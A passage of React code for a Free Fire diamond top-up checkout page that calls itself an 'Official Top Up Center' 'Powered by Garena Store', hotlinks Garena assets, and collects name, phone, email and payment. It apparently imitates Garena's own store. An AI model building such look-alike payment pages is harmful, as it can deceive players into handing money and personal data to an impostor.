16.2219C8.19194 16.2219 8.18231 16.2737 8.27825 16.3003C8.07826 16.4643 8.08739 16.6787 8.08739 16.6787L8.28724 16.6961C8.28724 16.6961 8.37342 16.9034 8.19194 16.9034C8.00945 16.9034 8.00057 16.9987 8.00057 16.9987V17.0931L8.096 17.1629L7.87587 17.3489C7.87587 17.3489 7.66752 18.1319 7.82999 19.582C8.40891 24.4364 13.0651 24.2304 13.0651 24.2304C13.0651 24.2304 17.6517 24.5978 19.7597 20.916C23.0032 15.1179 18.0454 13.8972 18.0454 13.8972C18.0454 13.8972 14.3855 13.0235 13.1807 14.3585C12.1089 15.5457 13.5514 16.9578 13.5514 16.9578C13.5514 16.9578 14.4087 17.5568 14.0145 18.5701C13.3594 20.253 11.5828 19.8334 11.5828 19.8334C11.5828 19.8334 8.80191 19.1686 9.45117 16.7523C10.3581 13.3735 14.7559 12.8164 14.7559 12.8164C14.7559 12.8164 19.4232 11.9764 22.2846 13.8868C23.5404 14.7256 25.6555 13.9906 25.6555 13.9906C25.044 14.5972 23.964 14.8053 23.9527 14.807C23.9532 14.807 23.9557 14.8065 23.9602 14.8058C24.0877 14.7838 25.8036 14.4876 28.0874 14.5433C30.3032 14.5964 31.6661 12.5633 31.6661 12.5633C31.6661 12.5633 31.2639 13.5216 29.4074 14.6231C26.6483 16.2595 26.2915 16.8663 26.2915 16.8663C26.2915 16.8663 26.524 16.7404 27.323 16.3371C25.4002 17.9829 24.1496 19.823 24.1496 19.823L23.9527 19.8811L24.0795 19.9951L24.253 20.0642L24.1947 20.2029L23.9757 20.2253C23.9757 20.2253 23.9527 20.5479 24.1612 20.6409C23.7903 20.9279 23.4314 21.3074 23.4314 21.3074L23.6159 21.3879C23.6159 21.3879 23.8709 21.6289 23.5465 21.9177C23.2687 22.2166 23.2568 21.837 23.2568 21.837C23.2568 21.837 23.2454 22.3198 22.6085 22.6538C22.4812 22.6992 22.2727 22.6416 22.2727 22.6416L21.9595 22.9987C21.9595 22.9987 24.1612 22.838 26.1071 22.032C22.539 23.7813 20.5126 23.7813 20.5126 23.7813V24.0341L20.7904 24.1037C20.7904 24.1037 20.0723 24.5398 17.3621 24.7826C17.8246 24.9317 17.8947 24.9205 17.8947 24.9205C17.8947 24.9205 17.2572 25.1273 15.7178 25.23C16.3083 25.4379 16.898 25.5081 16.898 25.5081L12.3351 25.5421C8.82523 25.5069 1.68961 22.5415 3.50964 16.1181C5.45538 9.25017 14.1769 8.04375 14.1769 8.04375C14.1769 8.04375 9.96545 6.80094 6.18486 8.55928C2.3281 10.3553 0 9.31929 0 9.31929L1.67998 7.67337L1.07749 7.83464L2.22304 6.81038L2.3044 6.95969L3.86842 5.30346L3.99579 5.50048L4.11213 5.61466L4.1575 5.41789L4.05409 5.2458L4.54036 4.71781L4.48232 4.67135L4.85301 4.08419L5.13107 4.02666L5.98804 3.11721C5.98804 3.11721 5.46729 3.71646 5.13107 4.32603C4.96847 4.87756 4.63301 5.10757 4.63301 5.10757C4.63301 5.10757 4.65582 5.15453 4.71373 5.25688C5.00345 4.48705 6.61284 3.67001 6.61284 3.67001C6.61284 3.67001 6.26635 3.94647 5.89515 4.32603C6.43947 3.8426 10.2161 1.35762 10.2161 1.35762L10.3776 1.36908L10.3896 1.49509C10.3896 1.49509 8.32729 2.99031 7.34321 4.02666C8.21108 3.76254 9.20822 2.9212 9.20822 2.9212L9.2655 3.09481L9.56713 3.11721L9.67092 3.03778L9.94911 2.85246L10.053 2.78347L10.0884 2.58771L10.4583 2.60068L10.4933 2.69195H10.5864L10.7243 2.63505L10.7712 2.51948L10.6902 2.39296L10.7712 2.28922C10.7712 2.28922 10.8641 2.38125 10.9565 2.50865C11.2815 2.19707 12.6137 1.87491 12.6137 1.87491C12.6137 1.87491 12.5323 1.9901 12.4399 2.09359C16.0297 1.42611 19.0416 0.218171 19.0416 0.218171L19.2839 0.206337L19.3079 0.126396L19.5397 0.10298Z" fill="#E41E26"/>
              </g>
            </svg>

            <div style={{
              width: 2, height: isMobile ? 18 : 22,
              background: '#f59e0b', borderRadius: 4,
              margin: '0 10px', flexShrink: 0
            }} />

            <span style={{
              color: '#111', fontWeight: 900,
              fontSize: isMobile ? 10 : 12,
              letterSpacing: '0.6px',
              textTransform: 'uppercase',
              lineHeight: 1, whiteSpace: 'nowrap',
              overflow: 'hidden', textOverflow: 'ellipsis'
            }}>
              Official Top Up Center
            </span>
          </div>

          <div style={{
            background: '#fff0ef', border: '1px solid #fecaca',
            borderRadius: 999, padding: isMobile ? '4px 10px' : '5px 14px',
            display: 'flex', alignItems: 'center', gap: 5, flexShrink: 0, marginLeft: 8
          }}>
            <span style={{
              width: 6, height: 6, borderRadius: '50%',
              background: '#ee2c24', flexShrink: 0
            }} />
            <span style={{
              fontSize: isMobile ? 10 : 11, fontWeight: 700, color: '#333',
              maxWidth: isMobile ? 80 : 120,
              overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap'
            }}>
              {nick || 'Guest'}
            </span>
          </div>
        </div>
      </header>

      {/* LAYER 2 — GAME BANNER */}
      <div style={{
        position: 'relative',
        width: '100%',
        height: isMobile ? 88 : isTablet ? 110 : 130,
        overflow: 'hidden',
      }}>
        <div style={{
          position: 'absolute', inset: 0,
          backgroundImage: 'url("https://assets.garena.com/gop/mshop/www/live/assets/FF-f997537d.jpg")',
          backgroundSize: 'cover', backgroundPosition: 'center top',
        }} />
        <div style={{ position: 'absolute', inset: 0, background: 'rgba(0,0,0,0.38)' }} />
        <div style={{
          position: 'relative', height: '100%',
          display: 'flex', alignItems: 'center',
          padding: isMobile ? '0 14px' : '0 24px',
          gap: isMobile ? 10 : 14,
          maxWidth: isDesktop ? 1200 : '100%',
          margin: '0 auto',
        }}>
          <img
            src="https://play-lh.googleusercontent.com/_NBURlh6AOFiEpNimyU5bPNo6BI2zg4LA3cq-yprkXIhrvKTil-IOzGcuvc2hiuib4yxx11Lf5E1NFnKM6Uvpw=s120-rw"
            alt="Free Fire"
            style={{
              width: isMobile ? 44 : 52, height: isMobile ? 44 : 52,
              borderRadius: 10, border: '2px solid rgba(255,255,255,0.6)',
              objectFit: 'cover', flexShrink: 0,
              display: 'block'
            }}
            onError={(e) => {
              (e.target as HTMLImageElement).src =
                'https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png';
            }}
          />
          <div>
            <h1 style={{
              color: 'white', fontSize: isMobile ? 14 : 16,
              fontWeight: 900, margin: '0 0 5px',
            }}>Free Fire</h1>
            <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap', alignItems: 'center' }}>
              <span style={{
                background: 'rgba(18, 18, 18, 0.85)',
                border: '1px solid rgba(255, 255, 255, 0.15)',
                color: 'white',
                borderRadius: 20,
                padding: isMobile ? '3px 8px' : '4px 10px',
                fontSize: isMobile ? 9 : 10,
                fontWeight: 900,
                letterSpacing: '0.4px',
                display: 'inline-flex',
                alignItems: 'center',
                gap: 4
              }}>
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#10b981" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                  <path d="m9 12 2 2 4-4" />
                </svg>
                100% SECURE PAYMENTS
              </span>
              <span style={{
                background: 'linear-gradient(135deg, #eab308, #ca8a04)',
                color: '#1a1a1a',
                borderRadius: 20,
                padding: isMobile ? '3px 8px' : '4px 10px',
                fontSize: isMobile ? 9 : 10,
                fontWeight: 900,
                display: 'inline-flex',
                alignItems: 'center',
                gap: 4
              }}>
                <svg width="11" height="11" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2l2.4 5.2 5.6.8-4 4.1 1 5.7-5-2.8-5 2.8 1-5.7-4-4.1 5.6-.8z" />
                </svg>
                9TH ANNIVERSARY
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* LAYER 3 — CONTENT BODY */}
      <div style={{
        background: '#f5f6fa',
        padding: isMobile ? '14px 12px 40px' : isTablet ? '20px 24px 48px' : '28px 24px 60px',
        boxSizing: 'border-box'
      }}>
        <div style={{
          display: isDesktop ? 'grid' : 'block',
          gridTemplateColumns: isDesktop ? '1fr 1fr' : 'none',
          gap: isDesktop ? 20 : 0,
          maxWidth: isDesktop ? 1100 : 560,
          margin: '0 auto',
        }}>

          {/* Column 1 (Left on desktop) */}
          <div style={{ display: 'flex', flexDirection: 'column' }}>
            {/* CARD 1 — ORDER SUMMARY */}
            <div style={{ ...cardStyle, marginBottom: 12 }}>
              {renderCardHeader('①', 'Order Summary')}

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: isMobile ? '8px 0' : '10px 0', borderBottom: '1px solid #f5f5f5', fontSize: isMobile ? 12 : 13 }}>
                <span style={{ color: '#777' }}>Nickname</span>
                <span style={{ fontWeight: 700, color: '#111' }}>{nick || 'Guest'}</span>
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: isMobile ? '8px 0' : '10px 0', borderBottom: '1px solid #f5f5f5', fontSize: isMobile ? 12 : 13 }}>
                <span style={{ color: '#777' }}>UID</span>
                <span style={{ fontWeight: 700, color: '#111', fontFamily: 'monospace', letterSpacing: '0.5px' }}>{uid || 'N/A'}</span>
              </div>

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: isMobile ? '8px 0' : '10px 0', borderBottom: '1px solid #f5f5f5', fontSize: isMobile ? 12 : 13 }}>
                <span style={{ color: '#777' }}>Level</span>
                <span style={{ background: '#fef3c7', color: '#d97706', fontSize: 11, fontWeight: 700, padding: '2px 8px', borderRadius: 6 }}>
                  Lv. {level || '1'}
                </span>
              </div>

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: isMobile ? '8px 0' : '10px 0', borderBottom: '1px solid #f5f5f5', fontSize: isMobile ? 12 : 13 }}>
                <span style={{ color: '#777' }}>Diamonds</span>
                <span style={{ fontWeight: 800, color: '#ee2c24', fontSize: 14 }}>💎 {diamonds || 'Topup'}</span>
              </div>

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', paddingTop: 16, fontSize: isMobile ? 14 : 15 }}>
                <span style={{ fontWeight: 800, color: '#111' }}>Total Amount</span>
                <span style={{ fontWeight: 900, fontSize: isMobile ? 22 : 26, color: '#111' }}>₹{pkg}</span>
              </div>
            </div>
          </div>

          {/* Column 2 (Right on desktop) */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
            {/* CARD 2 — YOUR DETAILS */}
            <div style={cardStyle}>
              {renderCardHeader('②', 'Your Details')}

              <div style={{ marginBottom: isMobile ? 12 : 14 }}>
                <label style={{ fontSize: 12, fontWeight: 700, color: '#555', marginBottom: 6, display: 'block' }}>
                  Full Name
                </label>
                <input
                  type="text"
                  placeholder="Enter your full name"
                  value={form.name}
                  onChange={e => setForm(prev => ({ ...prev, name: e.target.value }))}
                  onFocus={() => setFocusedField('name')}
                  onBlur={() => setFocusedField(null)}
                  style={{
                    width: '100%',
                    padding: isMobile ? '13px 14px' : '13px 16px',
                    border: '1.5px solid',
                    borderColor: focusedField === 'name' ? '#ee2c24' : '#e8e8e8',
                    boxShadow: focusedField === 'name' ? '0 0 0 3px rgba(238,44,36,0.08)' : 'none',
                    borderRadius: 10,
                    fontSize: 16,
                    color: '#111',
                    outline: 'none',
                    boxSizing: 'border-box',
                    background: 'white',
                    WebkitAppearance: 'none',
                    appearance: 'none',
                    transition: 'border-color 0.15s, box-shadow 0.15s'
                  }}
                />
              </div>

              <div style={{ marginBottom: isMobile ? 12 : 14 }}>
                <label style={{ fontSize: 12, fontWeight: 700, color: '#555', marginBottom: 6, display: 'block' }}>
                  Phone Number
                </label>
                <input
                  type="tel"
                  placeholder="10-digit mobile number"
                  value={form.phone}
                  onChange={e => {
                    setForm(prev => ({ ...prev, phone: e.target.value.replace(/\D/g, '').slice(0, 10) }));
                    if (error.includes('mobile number')) setError('');
                  }}
                  onFocus={() => setFocusedField('phone')}
                  onBlur={() => setFocusedField(null)}
                  style={{
                    width: '100%',
                    padding: isMobile ? '13px 14px' : '13px 16px',
                    border: '1.5px solid',
                    borderColor: focusedField === 'phone' ? '#ee2c24' : '#e8e8e8',
                    boxShadow: focusedField === 'phone' ? '0 0 0 3px rgba(238,44,36,0.08)' : 'none',
                    borderRadius: 10,
                    fontSize: 16,
                    color: '#111',
                    outline: 'none',
                    boxSizing: 'border-box',
                    background: 'white',
                    WebkitAppearance: 'none',
                    appearance: 'none',
                    transition: 'border-color 0.15s, box-shadow 0.15s'
                  }}
                />
              </div>

              <div style={{ marginBottom: 12 }}>
                <label style={{ fontSize: 12, fontWeight: 700, color: '#555', marginBottom: 6, display: 'block' }}>
                  Email Address
                </label>
                <input
                  type="email"
                  placeholder="your@email.com"
                  value={form.email}
                  onChange={e => setForm(prev => ({ ...prev, email: e.target.value }))}
                  onFocus={() => setFocusedField('email')}
                  onBlur={() => setFocusedField(null)}
                  style={{
                    width: '100%',
                    padding: isMobile ? '13px 14px' : '13px 16px',
                    border: '1.5px solid',
                    borderColor: focusedField === 'email' ? '#ee2c24' : '#e8e8e8',
                    boxShadow: focusedField === 'email' ? '0 0 0 3px rgba(238,44,36,0.08)' : 'none',
                    borderRadius: 10,
                    fontSize: 16,
                    color: '#111',
                    outline: 'none',
                    boxSizing: 'border-box',
                    background: 'white',
                    WebkitAppearance: 'none',
                    appearance: 'none',
                    transition: 'border-color 0.15s, box-shadow 0.15s'
                  }}
                />
              </div>

              {error && (
                <div style={{
                  marginTop: 12, padding: '10px 14px',
                  background: '#fff5f5', border: '1px solid #fed7d7',
                  borderRadius: 8, color: '#e53e3e',
                  fontSize: 13, fontWeight: 600
                }}>
                  ⚠️ {error}
                </div>
              )}
            </div>

            {/* PAY NOW BUTTON */}
            {form.name.trim() && form.phone.trim() && form.email.trim() && (
              <button
                onClick={() => {
                  if (validateForm()) {
                    setShowPayModal(true);
                  }
                }}
                disabled={loading}
                style={{
                  width: '100%',
                  padding: isMobile ? '16px' : '18px',
                  background: loading ? '#ccc' : 'linear-gradient(135deg, #ee2c24, #c0392b)',
                  color: 'white',
                  border: 'none',
                  borderRadius: 14,
                  fontSize: isMobile ? 15 : 16,
                  fontWeight: 800,
                  cursor: loading ? 'not-allowed' : 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: 8,
                  boxShadow: loading ? 'none' : '0 6px 20px rgba(238,44,36,0.35)',
                  letterSpacing: '0.3px',
                  WebkitTapHighlightColor: 'transparent',
                  touchAction: 'manipulation',
                  outline: 'none',
                  marginTop: 4,
                }}
              >
                {loading ? '⏳ Processing…' : `🔒 Pay ₹${pkg}`}
              </button>
            )}

            {/* PAYMENT METHOD SELECTION MODAL */}
            {showPayModal && (
              <div
                onClick={() => setShowPayModal(false)}
                style={{
                  position: 'fixed', inset: 0, zIndex: 1000,
                  background: 'rgba(0,0,0,0.55)',
                  display: 'flex', alignItems: 'flex-end', justifyContent: 'center',
                }}
              >
                <div
                  onClick={e => e.stopPropagation()}
                  style={{
                    background: 'white',
                    borderRadius: '20px 20px 0 0',
                    padding: isMobile ? '24px 16px 36px' : '28px 28px 40px',
                    width: '100%', maxWidth: 480, boxSizing: 'border-box',
                  }}
                >
                  <div style={{ width: 36, height: 4, background: '#e0e0e0', borderRadius: 4, margin: '0 auto 20px' }} />

                  <div style={{ textAlign: 'center', marginBottom: 22 }}>
                    <div style={{ fontSize: 17, fontWeight: 900, color: '#111', letterSpacing: -0.3 }}>
                      Choose Payment Method
                    </div>
                    <div style={{ fontSize: 12, color: '#aaa', marginTop: 4, fontWeight: 500 }}>
                      Fast · Secure · Instant Diamond Credit
                    </div>
                  </div>

                  {/* Option 1 — UPI / QR (Uses Standard Normal Checkout with all payment modes) */}
                  <button
                    onClick={() => handlePay('ALL')}
                    disabled={loading}
                    style={{
                      width: '100%', display: 'flex', alignItems: 'center', gap: 12,
                      padding: '14px 16px', marginBottom: 12,
                      background: '#fff', border: '2px solid #ebebeb', borderRadius: 16,
                      cursor: 'pointer', textAlign: 'left', boxSizing: 'border-box',
                      WebkitTapHighlightColor: 'transparent', outline: 'none',
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 5, flexShrink: 0, background: '#f5f5f5', padding: '8px 10px', borderRadius: 12, minWidth: 110 }}>
                      <img src="https://play-lh.googleusercontent.com/yHTP3WYAPWUydt6zFfhpEUmKWBVJ5PLF7QHlwYy95WclJZwVm2TPKekK1OruO-T5IeuvnMcF6x-MU7F8iR8hkw=w480-h960-rw"
                        alt="GPay" style={{ height: 20, width: 20, objectFit: 'contain', borderRadius: 4, flexShrink: 0 }}
                        onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/71/PhonePe_Logo.svg/1920px-PhonePe_Logo.svg.png"
                        alt="PhonePe" style={{ height: 18, objectFit: 'contain', flexShrink: 0, maxWidth: 52 }}
                        onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/Paytm_Logo_%28standalone%29.svg/1920px-Paytm_Logo_%28standalone%29.svg.png"
                        alt="Paytm" style={{ height: 16, objectFit: 'contain', flexShrink: 0, maxWidth: 40 }}
                        onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                    </div>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{ fontWeight: 800, color: '#111', fontSize: 14, whiteSpace: 'nowrap' }}>Pay via UPI / QR Code</div>
                      <div style={{ fontSize: 11, color: '#999', marginTop: 3, fontWeight: 500 }}>GPay · PhonePe · Paytm · QR Scan</div>
                    </div>
                    <span style={{ color: '#ccc', fontSize: 20, flexShrink: 0 }}>›</span>
                  </button>

                  {/* Option 2 — Card / Net Banking (Uses Standard Normal Checkout with all payment modes) */}
                  <button
                    onClick={() => handlePay('ALL')}
                    disabled={loading}
                    style={{
                      width: '100%', display: 'flex', alignItems: 'center', gap: 12,
                      padding: '14px 16px', marginBottom: 20,
                      background: '#fff', border: '2px solid #ebebeb', borderRadius: 16,
                      cursor: 'pointer', textAlign: 'left', boxSizing: 'border-box',
                      WebkitTapHighlightColor: 'transparent', outline: 'none',
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 6, flexShrink: 0, background: '#f5f5f5', padding: '8px 10px', borderRadius: 12, minWidth: 110 }}>
                      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/UPI_logo.svg/1920px-UPI_logo.svg.png"
                        alt="UPI" style={{ height: 20, objectFit: 'contain', flexShrink: 0, maxWidth: 36 }}
                        onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Visa_Inc._logo_%282021%E2%80%93present%29.svg/1920px-Visa_Inc._logo_%282021%E2%80%93present%29.svg.png"
                        alt="Visa" style={{ height: 20, objectFit: 'contain', flexShrink: 0, maxWidth: 40 }}
                        onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1920px-Mastercard-logo.svg.png"
                        alt="MC" style={{ height: 22, objectFit: 'contain', flexShrink: 0, maxWidth: 28 }}
                        onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                    </div>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{ fontWeight: 800, color: '#111', fontSize: 14, whiteSpace: 'nowrap' }}>Card / Net Banking</div>
                      <div style={{ fontSize: 11, color: '#999', marginTop: 3, fontWeight: 500 }}>Credit Card · Debit Card · Netbanking</div>
                    </div>
                    <span style={{ color: '#ccc', fontSize: 20, flexShrink: 0 }}>›</span>
                  </button>

                  <div style={{ textAlign: 'center', fontSize: 11, color: '#aaa', fontWeight: 500 }}>
                    🔒 100% Secure · SSL Encrypted · Powered by Garena Store
                  </div>
                </div>
              </div>
            )}
          </div>

        </div>
      </div>
    </div>
  );
}
